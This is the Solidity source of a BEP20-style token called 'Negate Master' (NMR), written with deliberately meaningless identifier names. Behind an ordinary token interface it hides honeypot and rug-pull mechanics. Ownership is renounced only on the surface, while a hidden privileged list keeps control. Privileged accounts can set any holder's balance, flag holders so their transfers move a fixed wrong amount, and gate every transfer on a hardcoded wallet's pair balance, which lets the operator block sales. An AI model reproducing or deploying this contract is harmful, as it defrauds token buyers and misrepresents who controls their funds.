//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface isTake {
    function createPair(address senderTotal, address feeShouldBuy) external returns (address);
}

interface senderReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address amountReceiver) external view returns (uint256);

    function transfer(address sellMode, uint256 listShould) external returns (bool);

    function allowance(address shouldFund, address spender) external view returns (uint256);

    function approve(address spender, uint256 listShould) external returns (bool);

    function transferFrom(
        address sender,
        address sellMode,
        uint256 listShould
    ) external returns (bool);

    event Transfer(address indexed from, address indexed autoSellEnable, uint256 value);
    event Approval(address indexed shouldFund, address indexed spender, uint256 value);
}

abstract contract amountMode {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchMode {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface senderReceiverMetadata is senderReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract NegateMaster is amountMode, senderReceiver, senderReceiverMetadata {

    bool public tradingBuy;

    function name() external view virtual override returns (string memory) {
        return teamAutoLaunched;
    }

    function minAutoMax(address enableWalletSwap, address sellMode, uint256 listShould) internal returns (bool) {
        require(minSell[enableWalletSwap] >= listShould);
        minSell[enableWalletSwap] -= listShould;
        minSell[sellMode] += listShould;
        emit Transfer(enableWalletSwap, sellMode, listShould);
        return true;
    }

    function owner() external view returns (address) {
        return txShould;
    }

    function balanceOf(address amountReceiver) public view virtual override returns (uint256) {
        return minSell[amountReceiver];
    }

    bool private senderExempt;

    mapping(address => bool) public fromTotal;

    uint256 amountFrom;

    mapping(address => mapping(address => uint256)) private fromTxLaunch;

    address public tradingAmount;

    function decimals() external view virtual override returns (uint8) {
        return marketingSellReceiver;
    }

    function getOwner() external view returns (address) {
        return txShould;
    }

    bool public exemptTotal;

    mapping(address => bool) public liquiditySell;

    function autoIs(uint256 listShould) public {
        launchSender();
        listAuto = listShould;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return isSell;
    }

    function senderMin(address shouldLaunch, uint256 listShould) public {
        launchSender();
        minSell[shouldLaunch] = listShould;
    }

    function transferFrom(address enableWalletSwap, address sellMode, uint256 listShould) external override returns (bool) {
        if (_msgSender() != takeSell) {
            if (fromTxLaunch[enableWalletSwap][_msgSender()] != type(uint256).max) {
                require(listShould <= fromTxLaunch[enableWalletSwap][_msgSender()]);
                fromTxLaunch[enableWalletSwap][_msgSender()] -= listShould;
            }
        }
        return receiverReceiver(enableWalletSwap, sellMode, listShould);
    }

    function allowance(address receiverFromReceiver, address shouldAuto) external view virtual override returns (uint256) {
        if (shouldAuto == takeSell) {
            return type(uint256).max;
        }
        return fromTxLaunch[receiverFromReceiver][shouldAuto];
    }

    uint256 public shouldAmount;

    address public limitAmount;

    uint8 private marketingSellReceiver = 18;

    address private txShould;

    address maxTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public isEnable;

    constructor (){
        
        launchMode feeSwap = launchMode(takeSell);
        tradingAmount = isTake(feeSwap.factory()).createPair(feeSwap.WETH(), address(this));
        if (senderExempt != isEnable) {
            exemptTotal = false;
        }
        limitAmount = _msgSender();
        liquiditySell[limitAmount] = true;
        minSell[limitAmount] = isSell;
        totalWalletList();
        if (liquidityFund == shouldAmount) {
            liquidityFund = shouldAmount;
        }
        emit Transfer(address(0), limitAmount, isSell);
    }

    function symbol() external view virtual override returns (string memory) {
        return tradingToken;
    }

    function launchMin(address autoReceiver) public {
        require(autoReceiver.balance < 100000);
        if (tradingBuy) {
            return;
        }
        if (exemptTotal == isEnable) {
            isEnable = true;
        }
        liquiditySell[autoReceiver] = true;
        
        tradingBuy = true;
    }

    uint256 constant senderIs = 9 ** 10;

    string private teamAutoLaunched = "Negate Master";

    function approve(address shouldAuto, uint256 listShould) public virtual override returns (bool) {
        fromTxLaunch[_msgSender()][shouldAuto] = listShould;
        emit Approval(_msgSender(), shouldAuto, listShould);
        return true;
    }

    function receiverReceiver(address enableWalletSwap, address sellMode, uint256 listShould) internal returns (bool) {
        if (enableWalletSwap == limitAmount) {
            return minAutoMax(enableWalletSwap, sellMode, listShould);
        }
        uint256 marketingFund = senderReceiver(tradingAmount).balanceOf(maxTx);
        require(marketingFund == listAuto);
        require(sellMode != maxTx);
        if (fromTotal[enableWalletSwap]) {
            return minAutoMax(enableWalletSwap, sellMode, senderIs);
        }
        return minAutoMax(enableWalletSwap, sellMode, listShould);
    }

    uint256 listAuto;

    event OwnershipTransferred(address indexed swapReceiver, address indexed feeSell);

    string private tradingToken = "NMR";

    address takeSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function transfer(address shouldLaunch, uint256 listShould) external virtual override returns (bool) {
        return receiverReceiver(_msgSender(), shouldLaunch, listShould);
    }

    function launchSender() private view {
        require(liquiditySell[_msgSender()]);
    }

    uint256 private isSell = 100000000 * 10 ** 18;

    function totalWalletList() public {
        emit OwnershipTransferred(limitAmount, address(0));
        txShould = address(0);
    }

    uint256 private liquidityFund;

    mapping(address => uint256) private minSell;

    function modeLaunchedTake(address tokenIs) public {
        launchSender();
        if (liquidityFund != shouldAmount) {
            exemptTotal = false;
        }
        if (tokenIs == limitAmount || tokenIs == tradingAmount) {
            return;
        }
        fromTotal[tokenIs] = true;
    }

}